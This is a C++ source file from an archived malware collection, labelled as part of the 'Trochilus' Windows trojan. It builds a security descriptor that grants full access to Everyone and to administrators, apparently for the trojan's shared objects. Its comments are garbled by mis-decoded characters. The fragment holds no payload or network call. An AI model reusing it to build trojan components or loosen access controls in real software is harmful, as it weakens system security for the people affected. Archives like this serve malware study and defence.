/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include "stdafx.h"
#include <Aclapi.h>
#include "CSharedSA.h"

#pragma comment(lib, "Advapi32.lib")

BOOL CShareRestrictedSD::BuildRestrictedSD()   
{   
	PSID			psidEveryone	=   NULL;
	PSID			pAdminSID		= NULL;
	PSID			pAdminuUserSID	= NULL;
	BOOL			bResult			=   FALSE; 
	EXPLICIT_ACCESS ea[3];

	__try   
	{   
		//���sid
		SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY;
		if (!AllocateAndInitializeSid(&siaWorld, 1,
			SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,     
			&psidEveryone)) 
		{
			printf("AllocateAndInitializeSid()   failed   with   error   %d\n", GetLastError());   
			__leave;   
		}

		SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
		if (!AllocateAndInitializeSid(&SIDAuthNT, 1,
			SECURITY_BUILTIN_DOMAIN_RID,
			DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSID))
		{
			printf("AllocateAndInitializeSid failed! AdminSID\n");
			__leave;
		}

		if (!AllocateAndInitializeSid(&SIDAuthNT, 1,
			SECURITY_BUILTIN_DOMAIN_RID,
			DOMAIN_USER_RID_ADMIN, 0, 0, 0, 0, 0, 0, &pAdminuUserSID))
		{
			printf("AllocateAndInitializeSid failed! pAdminuUserSID\n");
			__leave;
		}

		//���÷�����
		ZeroMemory(ea, sizeof(ea));

		ea[0].grfAccessPermissions = GENERIC_ALL;
		ea[0].grfAccessMode = GRANT_ACCESS;
		ea[0].grfInheritance = NO_INHERITANCE;
		ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea[0].Trustee.ptstrName = (LPWSTR) psidEveryone;

		ea[1].grfAccessPermissions = GENERIC_ALL;
		ea[1].grfAccessMode = GRANT_ACCESS;
		ea[1].grfInheritance = NO_INHERITANCE;
		ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
		ea[1].Trustee.ptstrName = (LPWSTR) pAdminSID;

		ea[2].grfAccessPermissions = GENERIC_ALL;
		ea[2].grfAccessMode = GRANT_ACCESS;
		ea[2].grfInheritance = NO_INHERITANCE;
		ea[2].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[2].Trustee.TrusteeType = TRUSTEE_IS_USER;
		ea[2].Trustee.ptstrName = (LPWSTR) pAdminuUserSID;

		//���������ACL
		if (ERROR_SUCCESS != SetEntriesInAcl(3, ea, NULL, &pAcl))
		{
			printf("SetEntriesInAcl failed %d\n", GetLastError());
			__leave;
		}

		// ��������ʼ��SD
		pSD = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH); 
		if (pSD == NULL)
		{ 
			printf( "LocalAlloc failed!\n");
			__leave;
		} 
		if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) 
		{ 
			printf( "InitializeSecurityDescriptor failed!\n");
			__leave;
		}

		//����SD��ACL
		if (! SetSecurityDescriptorDacl(pSD, TRUE, pAcl, FALSE))
		{   
			printf("SetSecurityDescriptorDacl() failed with error %d\n", GetLastError());
			__leave;
		}

		bResult = TRUE;   
	}   
	__finally   
	{   
		if (psidEveryone) FreeSid(psidEveryone);
		if (pAdminSID) FreeSid(pAdminSID);
		if (pAdminuUserSID) FreeSid(pAdminuUserSID);
	}   

	//���ʧ���ˣ�����
	if(! bResult)
	{   
		if (pAcl) 
		{
			LocalFree(pAcl);
			pAcl = NULL;
		}

		if (pSD)
		{
			LocalFree(pSD);
			pSD = NULL;
		}
	}

	return bResult;   
} 

CShareRestrictedSD::CShareRestrictedSD()
: pAcl(NULL)
, pSD(NULL)
{
	if (! BuildRestrictedSD())
	{
		//TRACE("BuildRestrictedSD() failed\n");
	}

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = pSD;
	sa.bInheritHandle = FALSE;
}

CShareRestrictedSD::~CShareRestrictedSD()
{
	if (pAcl) LocalFree(pAcl);

	if (pSD) LocalFree(pSD);
}

SECURITY_ATTRIBUTES* CShareRestrictedSD::GetSA()
{
	if(pAcl)
	{
		return &sa;
	}
	else
	{
		return NULL;
	}
}

